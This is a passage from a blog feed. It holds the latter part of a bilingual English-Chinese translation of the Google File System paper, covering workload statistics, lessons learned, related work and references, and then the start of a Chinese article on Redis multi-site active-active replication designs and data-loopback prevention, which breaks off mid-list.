operations by size. Read sizes exhibit a bimodal distribution. The small reads (under 64 KB) come from seek-intensive clients that look up small pieces of data within huge files. The large reads (over 512 KB) come from long sequential reads through entire files.</p><p>表格4展示了操作按大小的分布情况。读取操作的大小呈双峰分布。小读取（小于 64 KB ）来自于寻址密集型客户端，这些客户端在大文件中查找小数据块。大读取（大于 512 KB ）来自于对整个文件的长时间连续读取操作。</p><p>A significant number of reads return no data at all in cluster Y. Our applications, especially those in the production systems, often use files as producer-consumer queues. Producers append concurrently to a file while a consumer reads the end of file. Occasionally, no data is returned when the consumer outpaces the producers. Cluster X shows this less often because it is usually used for short-lived data analysis tasks rather than long-lived distributed applications.</p><p>在集群 Y 中，有相当数量的读取操作返回的数据为空。我们的应用程序，特别是生产系统中的应用程序，通常将文件用作生产者-消费者队列。生产者同时向文件追加数据，而消费者则读取文件末尾的数据。偶尔，当消费者的速度超过生产者时，可能会返回空数据。与长期运行的分布式应用程序不同，集群 X 通常用于短期数据分析任务，因此这种情况在集群 X 中发生的概率较小。</p><p>Write sizes also exhibit a bimodal distribution. The large writes (over 256 KB) typically result from significant buffering within the writers. Writers that buffer less data, checkpoint or synchronize more often, or simply generate less data account for the smaller writes (under 64 KB).</p><p>写入操作的大小同样呈双峰分布。大写入操作（大于 256 KB ）通常是由写入程序中的大量缓存引起的。缓存数据较少、更频繁进行检查点或同步、或者生成的数据量较少的写入程序导致了小写入操作（小于 64 KB ）。</p><p>As for record appends, cluster Y sees a much higher percentage of large record appends than cluster X does because our production systems, which use cluster Y, are more aggressively tuned for GFS.</p><p>关于记录追加操作，我们看到集群 Y 中大记录的追加比例比集群 X 高得多，因为我们使用集群 Y 的生产系统更积极地针对 GFS 进行了调优。</p><p>Table 5 shows the total amount of data transferred in operations of various sizes. For all kinds of operations, the larger operations (over 256 KB) generally account for most of the bytes transferred. Small reads (under 64 KB) do transfer a small but significant portion of the read data because of the random seek workload.</p><p>表 5 显示了各种大小的操作中传输的总数据量。对于所有类型的操作来说，较大的操作（大于 256 KB ）通常占据了大部分传输的字节数。由于随机查找工作负载的存在，小型的读取操作（小于 64 KB ）确实会传输一小部分但却很重要的读取数据。</p><h3 id="6-3-3、追加与写入"><a href="#6-3-3、追加与写入" class="headerlink" title="6.3.3、追加与写入"></a>6.3.3、追加与写入</h3><p>Record appends are heavily used especially in our production systems. For cluster X, the ratio of writes to record appends is 108:1 by bytes transferred and 8:1 by operation counts. For cluster Y, used by the production systems, the ratios are 3.7:1 and 2.5:1 respectively. Moreover, these ratios suggest that for both clusters record appends tend to be larger than writes. For cluster X, however, the overall usage of record append during the measured period is fairly low and so the results are likely skewed by one or two applications with particular buffer size choices.</p><p>记录追加操作在我们的生产系统中得到了广泛使用。对于集群 X ，按传输的字节数计算，写操作与记录追加操作的比率为 108:1 ，按操作计数计算，比率为 8:1 。对于生产系统使用的集群 Y ，这些比率分别为 3.7:1 和 2.5:1 。此外，这些比率表明，对于这两个集群，记录追加操作往往比写操作更大。然而，对于集群 X ，在测量期间记录追加操作的整体使用率相对较低，因此结果可能会受到一两个具有特定缓冲区大小选择的应用程序的影响。</p><p>As expected, our data mutation workload is dominated by appending rather than overwriting. We measured the amount of data overwritten on primary replicas. This approximates the case where a client deliberately overwrites previous written data rather than appends new data. For cluster X, overwriting accounts for under 0.0001% of bytes mutated and under 0.0003% of mutation operations. For cluster Y, the ratios are both 0.05%. Although this is minute, it is still higher than we expected. It turns out that most of these overwrites came from client retries due to errors or timeouts. They are not part of the workload per se but a consequence of the retry mechanism.</p><p>正如预期的那样，我们的数据变更（变异）的⼯作负载主要是追加⽽不是覆盖。我们测量了主副本上被覆盖的数据量。这近似于客户端有意覆盖之前写入的数据而不是追加新数据的情况。对于 X 集群，覆盖的字节占变更（变异）字节的不到 0.0001％ ，变更（变异）操作的比例不到 0.0003％ 。对于 Y 集群，这些比例都是 0.05％ 。尽管这很小，但它仍然比我们预期的要高。事实证明，大多数这些覆盖都来自于客户端重试由于错误或超时而导致的情况。它们不是工作负载本身的一部分，而是重试机制的后果。</p><div><p><img src="/assets/images/gfs-bytes-transferred-breakdown-by-operation-size.png" alt="表 5：按操作大小划分的传输字节数细分" loading="lazy"></p></div><p>For reads, the size is the amount of data actually read and transferred, rather than the amount requested. The two may differ if the read attempts to read beyond end of file, which by design is not uncommon in our workloads.</p><p>对于读取，大小是实际读取和传输的数据量，而不是请求的数据量。 如果读取尝试读取文件末尾以外的内容，这两者可能会有所不同，这在我们的工作负载中并不少见。</p><div><p><img src="/assets/images/gfs-master-requests-breakdown-by-type.png" alt="表 6：按类型划分的主服务器的请求" loading="lazy"></p></div><h3 id="6-3-4、Master-工作负载"><a href="#6-3-4、Master-工作负载" class="headerlink" title="6.3.4、Master 工作负载"></a>6.3.4、Master 工作负载</h3><p>Table 6 shows the breakdown by type of requests to the master. Most requests ask for chunk locations (FindLocation) for reads and lease holder information (FindLeaseLocker) for data mutations.</p><p>表格 6 显示了对主服务器请求类型的分类。大多数请求是为了读取数据而请求块位置（FindLocation），而租约持有者信息（FindLeaseLocker）主要是用于进行数据变更（变异）。</p><p>Clusters X and Y see significantly different numbers of Delete requests because cluster Y stores production data sets that are regularly regenerated and replaced with newer versions. Some of this difference is further hidden in the difference in Open requests because an old version of a file may be implicitly deleted by being opened for write from scratch (mode “w” in Unix open terminology).</p><p>集群 X 和 Y 的删除请求数量明显不同，因为集群 Y 存储的生产数据集定期被新版本替换和重生成。其中一些差异进一步隐藏在打开请求的差异中，因为通过从头开始写入（ Unix 打开术语中的 “w” 模式）打开文件的旧版本可能会被隐式删除。</p><p>FindMatchingFiles is a pattern matching request that supports “ls” and similar file system operations. Unlike other requests for the master, it may process a large part of the namespace and so may be expensive. Cluster Y sees it much more often because automated data processing tasks tend to examine parts of the file system to understand global application state. In contrast, cluster X’s applications are under more explicit user control and usually know the names of all needed files in advance.</p><p>FindMatchingFiles 是一种支持 “ls” 和类似文件系统操作的模式匹配请求。与对主服务器的其他请求不同，它可能处理命名空间的大部分，因此可能很昂贵。集群 Y 更经常看到这个请求，因为自动化数据处理任务倾向于检查文件系统的部分以了解全局应用程序状态。相比之下，集群 X 的应用程序处于更明确的用户控制之下，并且通常提前知道所有需要的⽂件的名称。</p><h1 id="7、经验"><a href="#7、经验" class="headerlink" title="7、经验"></a>7、经验</h1><p>In the process of building and deploying GFS, we have experienced a variety of issues, some operational and some technical.</p><p>在构建和部署 GFS 的过程中，我们遇到了各种问题，有些是操作上的问题，有些是技术上的问题。</p><p>Initially, GFS was conceived as the backend file system for our production systems. Over time, the usage evolved to include research and development tasks. It started with little support for things like permissions and quotas but now includes rudimentary forms of these. While production systems are well disciplined and controlled, users sometimes are not. More infrastructure is required to keep users from interfering with one another.</p><p>最初， GFS 被设想为我们生产系统的后端文件系统。随着时间的推移，使用方式发展为包括研究和开发任务。它最初对权限和配额等方面的支持很少，但现在包括这些方面的基本形式。虽然生产系统受到良好的纪律和控制，但用户有时却没有。需要更多的基础设施来防止用户相互干扰。</p><p>Some of our biggest problems were disk and Linux related. Many of our disks claimed to the Linux driver that they supported a range of IDE protocol versions but in fact responded reliably only to the more recent ones. Since the protocol versions are very similar, these drives mostly worked, but occasionally the mismatches would cause the drive and the kernel to disagree about the drive’s state. This would corrupt data silently due to problems in the kernel. This problem motivated our use of checksums to detect data corruption, while concurrently we modified the kernel to handle these protocol mismatches.</p><p>我们遇到的一些最大的问题与磁盘和 Linux 有关。我们的许多磁盘声称它们支持一系列 IDE 协议版本，但实际上只对较新的版本做出可靠响应。由于协议版本非常相似，这些驱动器大多可以正常工作，但偶尔不匹配会导致驱动器和内核对驱动器的状态产生分歧。由于内核中的问题，这会无声地损坏数据。这个问题促使我们使用校验和来检测数据损坏，同时我们修改了内核以处理这些协议不匹配。</p><p>Earlier we had some problems with Linux 2.2 kernels due to the cost of fsync(). Its cost is proportional to the size of the file rather than the size of the modified portion. This was a problem for our large operation logs especially before we implemented checkpointing. We worked around this for a time by using synchronous writes and eventually migrated to Linux 2.4.</p><p>早期，我们由于 fsync() 的成本与 Linux 2.2 内核存在一些问题。fsync() 的成本与文件的大小成正比，而不是修改部分的大小。这对于我们的大型操作日志来说是一个问题，特别是在我们实施检查点之前。我们通过使用同步写入来解决了这个问题，并最终迁移到了 Linux 2.4 。</p><p>Another Linux problem was a single reader-writer lock which any thread in an address space must hold when it pages in from disk(reader lock) or modifies the address space in an mmap() call (writer lock). We saw transient timeouts in our system under light load and looked hard for resource bottlenecks or sporadic hardware failures. Eventually, we found that this single lock blocked the primary network thread from mapping new data into memory while the disk threads were paging in previously mapped data. Since we are mainly limited by the network interface rather than by memory copy bandwidth, we worked around this by replacing mmap() with pread() at the cost of an extra copy.</p><p>另一个 Linux 问题是单个读写锁，任何一个地址空间中的线程在从磁盘页面调入（读取锁）或修改地址空间中的 mmap() 调用（写入锁）时必须持有该锁。我们在低负载下看到了系统中的瞬时超时，并且努力寻找资源瓶颈或零星的硬件故障。最终，我们发现这个单一的锁会阻止主网络线程将新数据映射到内存中，而磁盘线程正在调入先前映射的数据。由于我们主要受到网络接口的限制而不是内存复制带宽的限制，我们通过将 mmap() 替换为 pread() 来解决这个问题，代价是多了一次复制。</p><p>Despite occasional problems, the availability of Linux code has helped us time and again to explore and understand system behavior. When appropriate, we improve the kernel and share the changes with the open source community.</p><p>尽管偶尔会遇到问题， Linux 代码的可用性一次又一次地帮助我们探索和理解系统行为。在适当的情况下，我们会改进内核并与开源社区分享这些变化。</p><h1 id="8、相关工作"><a href="#8、相关工作" class="headerlink" title="8、相关工作"></a>8、相关工作</h1><p>Like other large distributed file systems such as AFS [5], GFS provides a location independent namespace which enables data to be moved transparently for load balance or fault tolerance. Unlike AFS, GFS spreads a file’s data across storage servers in a way more akin to xFS [1] and Swift [3] in order to deliver aggregate performance and increased fault tolerance.</p><p>与其他大型分布式文件系统（如 AFS [5] ）一样， GFS 提供了一个位置独立的命名空间，可以实现数据的透明移动以实现负载平衡或容错。但是，与 AFS 不同的是， GFS 通过一种类似于 xFS [1] 和 Swift [3] 的方式将文件的数据分散到存储服务器上，以提供聚合性能和增加容错性。</p><p>As disks are relatively cheap and replication is simpler than more sophisticated RAID [9] approaches, GFS currently uses only replication for redundancy and so consumes more raw storage than xFS or Swift.</p><p>由于磁盘相对便宜，而复制比更复杂的 RAID [9] 方法更简单，因此 GFS 目前仅使用复制来实现冗余，因此消耗的原始存储空间比 xFS 或 Swift 更多。</p><p>In contrast to systems like AFS, xFS, Frangipani [12], and Intermezzo [6], GFS does not provide any caching below the file system interface. Our target workloads have little reuse within a single application run because they either stream through a large data set or randomly seek within it and read small amounts of data each time.</p><p>与 AFS 、 xFS 、 Frangipani 和 Intermezzo 等系统不同， GFS 在文件系统接口以下不提供任何缓存。我们的目标工作负载在单个应用程序运行期间很少重用，因为它们要么通过大型数据集进行流式传输，要么随机搜索其中并每次读取少量数据。</p><p>Some distributed file systems like Frangipani, xFS, Minnesota’s GFS[11] and GPFS [10] remove the centralized server and rely on distributed algorithms for consistency and management. We opt for the centralized approach in order to simplify the design, increase its reliability, and gain flexibility. In particular, a centralized master makes it much easier to implement sophisticated chunk placement and replication policies since the master already has most of the relevant information and controls how it changes.We address fault tolerance by keeping the master state small and fully replicated on other machines. Scalability and high availability (for reads) are currently provided by our shadow master mechanism. Updates to the master state are made persistent by appending to a write-ahead log. Therefore we could adapt a primary-copy scheme like the one in Harp [7] to provide high availability with stronger consistency guarantees than our current scheme.</p><p>一些分布式文件系统，比如 Frangipani、xFS、明尼苏达州的 GFS[11] 和 GPFS [10]，取消了中心化的服务器，依靠分布式算法来保证一致性和管理。我们选择集中式的方法以简化设计、提高可靠性和增加灵活性。特别地，一个集中式的主服务器使得实现复杂的块放置和复制策略更加容易，因为主服务器已经拥有大部分相关信息并控制它如何变化。我们通过将主服务器状态保持小并完全复制到其他机器来解决容错问题。可扩展性和高可用性（对于读操作）目前通过我们的影子主服务器机制来提供。主服务器状态的更新通过追加到预写日志来实现持久性。因此，我们可以采用类似 Harp[7] 中的主副本方案来提供高可用性，并具有比我们当前方案更强的一致性保证。</p><p>We are addressing a problem similar to Lustre [8] in terms of delivering aggregate performance to a large number of clients. However, we have simplified the problem significantly by focusing on the needs of our applications rather than building a POSIX-compliant file system. Additionally, GFS assumes large number of unreliable components and so fault tolerance is central to our design.</p><p>我们在解决问题上类似于 Lustre[8]，即向大量客户端提供聚合性能的问题。然而，我们通过关注我们应用程序的需求而不是构建符合 POSIX 的文件系统，显著简化了这个问题。此外，GFS 假设存在大量不可靠的组件，因此容错性是我们设计的核心。</p><p>GFS most closely resembles the NASD architecture [4]. While the NASD architecture is based on network-attached diskdrives, GFS uses commodity machines as chunkservers, as done in the NASD prototype. Unlike the NASD work, our chunkservers use lazily allocated fixed-size chunks rather than variable-length objects. Additionally, GFS implements features such as rebalancing, replication, and recovery that are required in a production environment.</p><p>GFS 最接近的是 NASD 架构[4]。虽然 NASD 架构基于网络附加磁盘驱动器，但 GFS 使用像 NASD 原型中一样的通用机器作为块服务器。与 NASD 的工作不同，我们的块服务器使用懒惰分配的固定大小块，而不是可变长度对象。此外，GFS 实现了在生产环境中所需的重新平衡、复制和恢复等功能。</p><p>Unlike Minnesota’s GFS and NASD, we do not seek to alter the model of the storage device. We focus on addressing day-to-day data processing needs for complicated distributed systems with existing commodity components.</p><p>与明尼苏达州的 GFS 和 NASD 不同，我们不试图改变存储设备的模型。我们专注于利用现有的通用组件，解决复杂分布式系统的日常数据处理需求。</p><p>The producer-consumer queues enabled by atomic record appends address a similar problem as the distributed queues in River [2]. While River uses memory-based queues distributed across machines and careful data flow control, GFS uses a persistent file that can be appended to concurrently by many producers. The River model supports m-to-n distributed queues but lacks the fault tolerance that comes with persistent storage, while GFS only supports m-to-1 queues efficiently. Multiple consumers can read the same file, but they must coordinate to partition the incoming load.</p><p>原子记录追加所实现的生产者-消费者队列解决了与 River[2] 中的分布式队列类似的问题。River 使用基于内存的分布式队列和精细的数据流控制，而 GFS 使用可以由多个生产者并发追加的持久性文件。River 模型支持 m 对 n 的分布式队列，但缺乏持久存储所带来的容错性，而 GFS 只有效地支持 m 对 1 的队列。多个消费者可以读取相同的文件，但必须协调来分配进入的负载。</p><h1 id="9、结论"><a href="#9、结论" class="headerlink" title="9、结论"></a>9、结论</h1><p>The Google File System demonstrates the qualities essential for supporting large-scale data processing workloads on commodity hardware. While some design decisions are specific to our unique setting, many may apply to data processing tasks of a similar magnitude and cost consciousness. We started by reexamining traditional file system assumptions in light of our current and anticipated application workloads and technological environment.</p><p>Google File System 展示了支持通用硬件上大规模数据处理工作负载所必需的特性。虽然一些设计决策是针对我们独特的环境做出的，但许多决策可能适用于类似规模和成本意识的数据处理任务。我们从重新审视传统文件系统的假设开始，结合我们当前和预期的应用工作负载和技术环境。</p><p>Our observations have led to radically different points in the design space. We treat component failures as the norm rather than the exception, optimize for huge files that are mostly appended to (perhaps concurrently) and then read (usually sequentially), and both extend and relax the standard file system interface to improve the overall system.</p><p>我们的观察结果导致设计空间中出现了根本不同的观点。我们将组件故障视为常态而非例外，针对大部分被追加写入（可能是并发的）并随后被顺序读取的大型文件进行优化，同时扩展和放宽标准文件系统接口以改善整个系统。</p><p>Our system provides fault tolerance by constant monitoring, replicating crucial data, and fast and automatic recovery. Chunk replication allows us to tolerate chunkserver failures. The frequency of these failures motivated a novel online repair mechanism that regularly and transparently repairs the damage and compensates for lost replicas as soon as possible. Additionally, we use checksumming to detect data corruption at the diskor IDE subsystem level, which becomes all too common given the number of disks in the system.</p><p>我们的系统通过不断监控、复制重要数据以及快速自动恢复来提供容错功能。块复制使我们能够容忍块服务器故障。这些故障的频率激发了一种新颖的在线修复机制，定期并透明地修复损坏，并尽快补偿丢失的副本。此外，我们使用校验和来检测磁盘或 IDE 子系统级别的数据损坏，这在系统中的磁盘数量很多时变得司空见惯。</p><p>Our design delivers high aggregate throughput to many concurrent readers and writers performing a variety of tasks. We achieve this by separating file system control, which passes through the master, from data transfer, which passes directly between chunkservers and clients. Master involvement in common operations is minimized by a large chunk size and by chunkleases, which delegates authority to primary replicas in data mutations. This makes possible a simple, centralized master that does not become a bottleneck. We believe that improvements in our networking stack will lift the current limitation on the write throughput seen by an individual client.</p><p>我们的设计为执行各种任务的许多并发读写器提供了高聚合吞吐量。我们通过将文件系统控制（通过主服务器）与数据传输（直接在块服务器和客户端之间传递）分离来实现这一点。通过大块大小和块租约将权限委托给数据变异中的主要副本，可以将主服务器对常见操作的参与最小化。这使得可能实现一个简单的、集中的主服务器，不会成为瓶颈。我们相信，改进我们的网络堆栈将解除当前单个客户端写吞吐量的限制。</p><p>GFS has successfully met our storage needs and is widely used within Google as the storage platform for research and development as well as production data processing. It is an important tool that enables us to continue to innovate and attack problems on the scale of the entire web.</p><p>GFS 已成功满足我们的存储需求，并在 Google 内广泛应用作为研究开发和生产数据处理的存储平台。它是一个重要的工具，使我们能够在整个网络的规模上继续创新和解决问题。</p><h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p>We wish to thankthe following people for their contributions to the system or the paper. Brain Bershad (our shepherd) and the anonymous reviewers gave us valuable comments and suggestions. Anurag Acharya, Jeff Dean, and David desJardins contributed to the early design. Fay Chang worked on comparison of replicas across chunkservers. Guy Edjlali worked on storage quota. Markus Gutschke worked on a testing frameworkand security enhancements. David Kramer worked on performance enhancements. Fay Chang, Urs Hoelzle, Max Ibel, Sharon Perl, Rob Pike, and Debby Wallach commented on earlier drafts of the paper. Many of our colleagues at Google bravely trusted their data to a new file system and gave us useful feedback. Yoshka helped with early testing.</p><p>我们要感谢以下人员对系统或论文的贡献。 Brain Bershad（我们的牧羊人）和匿名审稿人给了我们宝贵的意见和建议。 Anurag Acharya、Jeff Dean 和 David desJardins 为早期设计做出了贡献。 Fay Chang 致力于跨 chunkservers 的副本比较。 Guy Edjlali 负责存储配额。 Markus Gutschke 致力于测试框架和安全增强。 David Kramer 致力于性能增强。 Fay Chang、Urs Hoelzle、Max Ibel、Sharon Perl、Rob Pike 和 Debby Wallach 对本文的早期草稿进行了评论。 我们在谷歌的许多同事勇敢地将他们的数据托付给了一个新的文件系统，并给了我们有用的反馈。 Yoshka 帮助进行了早期测试。</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><div>[1]. Thomas Anderson, Michael Dahlin, Jeanna Neefe, David Patterson, Drew Roselli, and Randolph Wang. Serverless networkfile systems. In Proceedings of the 15th ACM Symposium on Operating System Principles, pages 109–126, Copper Mountain Resort, Colorado, December 1995.<p>[2]. Remzi H. Arpaci-Dusseau, Eric Anderson, Noah Treuhaft, David E. Culler, Joseph M. Hellerstein, David Patterson, and Kathy Yelick. Cluster I&#x2F;O with River: Making the fast case common. In Proceedings of the Sixth Workshop on Input&#x2F;Output in Parallel and Distributed Systems (IOPADS ’99), pages 10–22, Atlanta, Georgia, May 1999.</p><p>[3]. Luis-Felipe Cabrera and Darrell D. E. Long. Swift: Using distributed diskstriping to provide high I&#x2F;O data rates. Computer Systems, 4(4):405–436, 1991.</p><p>[4]. Garth A. Gibson, David F. Nagle, Khalil Amiri, Jeff Butler, Fay W. Chang, Howard Gobioff, Charles Hardin, ErikRiedel, David Rochberg, and Jim Zelenka. A cost-effective, high-bandwidth storage architecture. In Proceedings of the 8th Architectural Support for Programming Languages and Operating Systems, pages 92–103, San Jose, California, October 1998.</p><p>[5]. John Howard, Michael Kazar, Sherri Menees, David Nichols, Mahadev Satyanarayanan, Robert Sidebotham, and Michael West. Scale and performance in a distributed file system. ACM Transactions on Computer Systems, 6(1):51–81, February 1988.</p><p>[6]. InterMezzo. <a href="http://www.inter-mezzo.org/">http://www.inter-mezzo.org</a>, 2003.</p><p>[7]. Barbara Liskov, Sanjay Ghemawat, Robert Gruber, Paul Johnson, Liuba Shrira, and Michael Williams. Replication in the Harp file system. In 13th Symposium on Operating System Principles, pages 226–238, Pacific Grove, CA, October 1991.</p><p>[8]. Lustre. <a href="http://www.lustreorg/">http://www.lustreorg</a>, 2003.</p><p>[9]. David A. Patterson, Garth A. Gibson, and Randy H. Katz. A case for redundant arrays of inexpensive disks (RAID). In Proceedings of the 1988 ACM SIGMOD International Conference on Management of Data, pages 109–116, Chicago, Illinois, September 1988.</p><p>[10]. FrankSchmuckand Roger Haskin. GPFS: A shared-diskfile system for large computing clusters. In Proceedings of the First USENIX Conference on File and Storage Technologies, pages 231–244, Monterey, California, January 2002.</p><p>[11]. Steven R. Soltis, Thomas M. Ruwart, and Matthew T. O’Keefe. The Gobal File System. In Proceedings of the Fifth NASA Goddard Space Flight Center Conference on Mass Storage Systems and Technologies, College Park, Maryland, September 1996.</p><p>[12]. Chandramohan A. Thekkath, Timothy Mann, and Edward K. Lee. Frangipani: A scalable distributed file system. In Proceedings of the 16th ACM Symposium on Operating System Principles, pages 224–237, Saint-Malo, France, October 1997.</p></div>]]></content>
      
      
      <categories>
          
          <category> 论文 </category>
          
          <category> 分布式 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Redis异地多活方案杂谈</title>
      <link href="/2022/12/31/redis-az-sync/"/>
      <url>/2022/12/31/redis-az-sync/</url>
      
        <content type="html"><![CDATA[<p>Redis 的异地多活是一种跨地域容灾、并提供低延迟访问的部署方案。业界提供了很多的构建思路，这里将对比一下这里方案，并详细介绍一下业界的设计与实现。</p><h1 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h1><h1 id="二、思考"><a href="#二、思考" class="headerlink" title="二、思考"></a>二、思考</h1><h2 id="2-1、Redis异地多活的定位"><a href="#2-1、Redis异地多活的定位" class="headerlink" title="2.1、Redis异地多活的定位"></a>2.1、Redis异地多活的定位</h2><p>在使用 Redis 的异地多活部署方案之前，为了提供 Redis 集群的高可用，我们也会提供跨地域主从的部署方式，通过这种方式我们也能实现地域级别的容灾能力。考虑到业务在使用 Redis 前的关注点一般是：性能、延迟、可用性以及数据一致性，我们将通过这四个关键点来对比一下这两种方案的不同：</p><ul><li><strong>性能（高性能， QPS ）</strong>：<ul><li>跨地域主从：跨地域写性能较差，本地域读性能较好；</li><li>异地多活：本地域读写性能较好；</li></ul></li><li><strong>延迟（低延迟， Avg ， P99 等）</strong>：<ul><li>跨地域主从：跨地域写延迟交高，本地域读延迟较低；</li><li>异地多活：本地域读写延迟较低；</li></ul></li><li><strong>可用性（高可用）</strong>：<ul><li>跨地域主从：集群间的容灾切换，存在主从切换的瞬时访问问题，满足高可用需求；</li><li>异地多活：集群内的主从故障切换，满足高可用需求；</li></ul></li><li><strong>数据一致性</strong>：<ul><li>跨地域主从：提供 Redis 的主从同步的数据一致性保障，弱最终一致性（主从数据同步可能会执行失败）；</li><li>异地多活：依赖于同步组件提供的数据一致性保障，基本也符合弱最终一致性；</li></ul></li></ul><p>因此我们可以看到：<strong>Redis异地多活的主要定位还是提供低延迟高性能的访问需求，地域级别的容灾只是它的特性之一。</strong></p><h2 id="2-2、Redis异地多活的功能"><a href="#2-2、Redis异地多活的功能" class="headerlink" title="2.2、Redis异地多活的功能"></a>2.2、Redis异地多活的功能</h2><ul><li>集群规模：支持两集群，三集群以及多集群的部署规模；</li><li>同步性能：能够支撑 Redis 极端负载情况下的数据写入速度；</li><li>数据一致性：尽可能的满足多集群数据一致性的需求；</li><li>运维：完善的监控报警，便捷的运维手段；</li></ul><h1 id="三、设计"><a href="#三、设计" class="headerlink" title="三、设计"></a>三、设计</h1><h2 id="3-1、数据同步"><a href="#3-1、数据同步" class="headerlink" title="3.1、数据同步"></a>3.1、数据同步</h2><h3 id="3-1-1、数据同步方式"><a href="#3-1-1、数据同步方式" class="headerlink" title="3.1.1、数据同步方式"></a>3.1.1、数据同步方式</h3><p>异地多活架构下一个非常重要的点就是数据要如何同步到其他地域，按照数据流的写入链路，这里提供了几种实现思路：</p><ul><li><p><strong>Proxy 多写</strong>：</p><ul><li>思路：Proxy 在收到客户端写请求之后，不仅将其转发到本地域的 Redis 实例上，还要将其转发到其他地域的 Proxy 上；</li><li>特点：<ul><li>数据推送模型；</li><li>前置路由的方式；</li><li>无需改造 Redis ，适用于该架构下的所有 Redis 版本；</li><li>仅适用于 Proxy + Redis 的部署架构；</li></ul></li><li>案例：未知；</li></ul></li><li><p><strong>Redis 主动转发</strong>：</p><ul><li>思路：Redis 在收到写请求之后，依据事先设定的转发规则，将其转发到其他地域的 Redis 集群中；</li><li>特点：<ul><li>数据推送模型；</li><li>后置路由的方式；</li><li>适用于 Proxy + Redis 和 RedisCluster 的部署架构；</li><li>需要改造每个版本的 Redis ，开发成本较高；</li></ul></li><li>案例： <a href="https://github.com/Snapchat/KeyDB">KeyDB</a> 等；</li></ul></li><li><p><strong>旁路组件转发（最常用）</strong>：</p><ul><li>思路：旁路组件通过伪造 Redis 从库或者其他的方式实时拉取 Redis 数据，然后将其转发到其他地域的 Redis 集群中；</li><li>特点：<ul><li>数据推 + 拉模型；</li><li>后置路由的方式；</li><li>基本与 Redis 解偶（可能需要改造 Redis ），架构上更加清晰，能够实现更多的定制化功能；</li></ul></li><li>案例：阿里、百度、携程、京东等；</li></ul></li><li><p><strong>多主架构：</strong></p><ul><li>思路：实现 Redis 多主的部署架构，多活集群内部的主库既是本地域集群的主库，也是其他地域集群的从库；</li><li>特点：<ul><li>数据拉取模型；</li><li>需要深度改造 Redis ，很多主从复制相关的流程都需要进行变动；</li></ul></li><li>案例：未知；</li></ul></li></ul><p>以上几种数据同步方式中，业界主要实现的还是 <strong>旁路组件转发</strong> 的方案， <strong>Proxy 多写</strong> 的方式有一些厂商支持，但是并不是专门针对于多活的场景进行开发的，通常是为了业务进行集群升级切换使用的。而 <strong>Redis 主动转发</strong> 的方案由于需要深度开发改造 Redis ，并且和存储节点耦合的过于严重，目前业界云厂商里面还没有相关的实现，不过 <a href="https://github.com/Snapchat/KeyDB">KeyDB</a> 倒是实现了一种类似于这种的 Redis 的双主方案，感兴趣的可以去阅读一下相关的实现。</p><h3 id="3-1-2、数据同步架构"><a href="#3-1-2、数据同步架构" class="headerlink" title="3.1.2、数据同步架构"></a>3.1.2、数据同步架构</h3><p>多集群部署架构下，集群间数据同步链路的架构对于整个多活集群的可用性有着一些影响，而常用的数据同步结构基本包括如下几种：</p><ul><li><strong>环形结构</strong>：<ul><li>数据流：每个节点（集群）都只有一个数据写入流和一个数据写出流，数据同步呈现单向环式流转；</li><li>特点：<ul><li>拓扑简易易理解；</li><li>存在单节点（集群）故障影响全局数据同步的问题；</li></ul></li><li>案例：未知；</li></ul></li><li><strong>星状结构</strong>：<ul><li>数据流：每个节点（集群）都只有一个数据写入流和数据写出流，数据同步全部经由一个中心路由节点进行流转；</li><li>特点：<ul><li>中心路由节点（集群）可以拥有全局的数据同步视角，进而实现对全局数据流的管控；</li><li>中心路由节点（集群）的故障会影响全局数据同步；</li></ul></li><li>案例：未知；</li></ul></li><li><strong>网状结构</strong>：<ul><li>数据流：每个节点（集群）都拥有多个数据写入和数据写出流，每个节点（集群）之间都有数据流交互；</li><li>特点：<ul><li>节点（集群）的故障不会影响其他节点（集群）间的数据同步，不存在中心节点（集群）的故障问题；</li><li>节点（集群）间的数据同步链路比较复杂，有很高的观测要求；</li></ul></li><li>案例：阿里、百度等；</li></ul></li></ul><h2 id="3-2、数据安全"><a href="#3-2、数据安全" class="headerlink" title="3.2、数据安全"></a>3.2、数据安全</h2><h3 id="3-2-1、数据回环"><a href="#3-2-1、数据回环" class="headerlink" title="3.2.1、数据回环"></a>3.2.1、数据回环</h3><h4 id="3-2-1-1、数据回环问题"><a href="#3-2-1-1、数据回环问题" class="headerlink" title="3.2.1.1、数据回环问题"></a>3.2.1.1、数据回环问题</h4><p>异地多活集群间的数据同步有一个比较典型的问题就是数据回环问题。简单举一个例子，两个集群（ A 集群 和 B 集群）进行数据同步时，客户端向 A 集群执行一个写命令后，该命令会被转发写入到 B 集群，如果这时候 B 集群不对写入命令进行区分和过滤，那么 B 集群有可能还会把这个写命令转发给 A 集群，如此循环往复。在这种场景下，这个命令不应该再次被写入 A 集群，这个问题就是 <strong>数据回环</strong> 。</p><p><img src="/assets/images/redis-az-sync-data-loopback.png" alt="数据回环示意图" loading="lazy"></p><h4 id="3-2-1-2、数据回环解决方案"><a href="#3-2-1-2、数据回环解决方案" class="headerlink" title="3.2.1.2、数据回环解决方案"></a>3.2.1.2、数据回环解决方案</h4><p>为了避免重复转发 Redis 命令，我们需要在转发数据节点阶段添加一些额外的信息用于标记命令的来源，以便于目标集群能够选择性的转发命令，避免出现数据回环问题。</p><p><img src="/assets/images/redis-az-sync-data-loopback-plan.png" alt="数据回环解决思路" loading="lazy"></p><p>以下列出了几种为了解决数据回环的信息标记方式：</p><ul><li><strong>改造 RESP 协议（最常用）</strong>：<ul><li>思路：改造 Redis 的 RESP 协议，通过使用一些字段来标记命令的特征，便于后续选择性的转发命令；</li><li>特点：<ul><li>严格遵循 Redis 的 RESP 协议规范；</li><li>自定义的改造空间很大；</li><li>社区版 Redis 无法识别改造后的命令请求，存在兼容性问题；</li></ul></li><li>案例：百度、京东等；</li></ul></li></ul><p><img src="/assets/images/redis-az-sync-data-loopback-plan-modified-resp.png" alt="数据回环之改造RESP协议方案" loading="lazy"></p><ul><li><strong>自定义命令</strong>：<ul><li>思路：<ul><li>每次执行 Redis 命令前&#x2F;后补充一个自定义的命令，用于标示下一个&#x2F;上一个命令的特征，便于后续选择性的转发命令；</li><li>自定义命令的想法也可以和改造 RESP 协议的想法进行结合，即改造命令中新增加的字段就是自定义的命令；</li></ul></li><li>特点：<ul><li>严格遵循 Redis 的 RESP 协议规范；</li><li>自定义命令的改造空间很大；</li><li>Redis 